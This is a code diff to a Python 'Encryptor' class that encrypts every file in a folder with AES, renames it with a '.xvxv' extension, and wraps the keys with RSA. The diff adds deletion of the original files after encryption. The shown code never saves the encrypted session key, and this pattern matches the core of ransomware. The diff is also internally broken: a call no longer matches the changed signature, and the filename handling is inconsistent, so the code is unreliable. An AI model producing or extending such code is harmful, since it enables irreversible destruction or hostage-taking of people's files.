@@ -34,7 +34,7 @@ class Encryptor:
     def generate_aes_key(self):
         return get_random_bytes(32)  # 256-bit AES key
 
-    def encrypt_file(self, input_file, output_file, session_key):
+    def encrypt_file(self, input_file, session_key):
         # Extract the original file name and extension
         filename, file_extension = os.path.splitext(input_file)
         encrypted_file = f"{filename}{file_extension}.xvxv"
@@ -54,6 +54,9 @@ class Encryptor:
                 encrypted_chunk = cipher.encrypt(chunk)
                 outfile.write(encrypted_chunk)
 
+        # Remove the original file after successful encryption
+        os.remove(input_file)
+
     def encrypt_files_in_folder(self, folder_path):
         private_key = RSA.import_key(open(self.private_key_path).read())
         public_key = RSA.import_key(open(self.public_key_path).read())
@@ -70,11 +73,11 @@ class Encryptor:
                 session_key = self.generate_aes_key()
                 encrypted_session_key = PKCS1_OAEP.new(public_key).encrypt(session_key)
 
-                self.encrypt_file(input_file_path, input_file_path, session_key)
+                self.encrypt_file(input_file_path, session_key)
 
                 print(f"Encrypted {file_name} successfully.")
 
-    def decrypt_file(self, input_file, output_file, session_key):
+    def decrypt_file(self, input_file, session_key):
         with open(input_file, 'rb') as infile:
             iv = infile.read(16)
             cipher = AES.new(session_key, AES.MODE_CFB, iv)
@@ -86,8 +89,16 @@ class Encryptor:
                 decrypted_chunk = cipher.decrypt(chunk)
                 decrypted_data += decrypted_chunk
 
-        with open(output_file, 'wb') as outfile:
+        # Extract the original file name and extension from the encrypted file name
+        _, original_extension = os.path.splitext(input_file)
+        filename, _ = os.path.splitext(input_file)
+        original_file_path = f"{filename[:-6]}{original_extension}"
+
+        with open(original_file_path, 'wb') as outfile:
             outfile.write(decrypted_data)
+
+        # Remove the encrypted file after successful decryption
+        os.remove(input_file)
 
     def decrypt_files_in_folder(self, folder_path):
         private_key = RSA.import_key(open(self.private_key_path).read())
@@ -101,11 +112,6 @@ class Encryptor:
                     with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                         self.decrypt_file(input_file_path, temp_file.name, private_key)
 
-                    # Extract the original file name and extension
-                    filename, file_extension = os.path.splitext(file_name)
-                    original_file_path = f"{filename}{file_extension}"
-
-                    # Replace the original file with the temporary file
-                    shutil.move(temp_file.name, original_file_path)
-                    os.remove(input_file_path)
+                    # Replace the original file with the decrypted content
+                    shutil.move(temp_file.name, input_file_path)
                     print(f"Decrypted {file_name} successfully.")
